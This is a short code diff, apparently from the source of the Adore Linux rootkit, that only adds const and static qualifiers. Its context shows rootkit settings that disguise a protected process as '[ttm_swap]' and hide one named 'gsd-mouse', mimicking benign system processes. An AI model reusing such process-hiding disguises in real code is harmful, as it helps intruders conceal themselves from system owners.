@@ -21,12 +21,12 @@
 
 
 #define FLAG 0x80000000
-char *protected = "[ttm_swap]";
+const char *protected = "[ttm_swap]";
 int protected_pid = -1;
 int hide_pid = -1;
-char *hide = "gsd-mouse";
+const char *hide = "gsd-mouse";
 
-int adore_atoi(const char *str)
+static int adore_atoi(const char *str)
 {
         int ret = 0, mul = 1;
         const char *ptr;
